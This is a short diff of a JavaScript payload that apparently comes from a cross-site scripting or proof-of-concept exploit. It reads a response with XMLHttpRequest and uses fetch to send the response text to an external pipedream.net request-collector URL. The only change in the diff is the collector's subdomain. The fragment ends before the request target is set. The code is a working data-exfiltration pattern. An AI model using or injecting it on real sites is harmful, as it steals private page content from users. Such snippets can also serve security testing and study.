@@ -1,5 +1,5 @@
 function reqListener () {
-  fetch("https://enj1mevg4ope.x.pipedream.net/?"+this.responseText);
+  fetch("https://ennv0phuqv24d.x.pipedream.net/?"+this.responseText);
 }
 const req = new XMLHttpRequest();
 req.addEventListener("load", reqListener);
